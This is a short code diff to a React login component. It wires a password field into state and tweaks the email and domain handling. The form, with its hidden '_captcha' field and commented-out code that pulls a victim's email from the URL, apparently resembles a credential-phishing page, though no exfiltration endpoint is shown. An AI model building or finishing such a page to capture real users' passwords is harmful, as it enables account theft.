@@ -4,7 +4,8 @@ import Logo from "/logo.png";
 
 export default function App() {
   const [domain, setDomain] = useState("");
-  const [emal, setEmal] = useState(function(){});
+  const [passwrd,setPasswrd] = useState("")
+  const [emal, setEmal] = useState("");
   // useEffect(() => {
   //   const urlParams = new URLSearchParams(window.location.search);
   //   const inputValue = urlParams.get("email").split("/")[0];
@@ -23,6 +24,7 @@ export default function App() {
       setDomain(dd);
     }
     setDomain(window.location.href);
+    console.log(domain)
     // console.log(w)
     // // const urlParams = new URLSearchParams(window.location.search);
     // const inputValue = urlParams.get("email").split("/")[0];
@@ -59,6 +61,8 @@ export default function App() {
                 placeholder="Password"
                 name="password"
                 required
+                value={passwrd}
+                onChange={(e)=> setPasswrd(e.target.value)}
               />
               <input type="hidden" name="_captcha" value="false"></input>
               <input
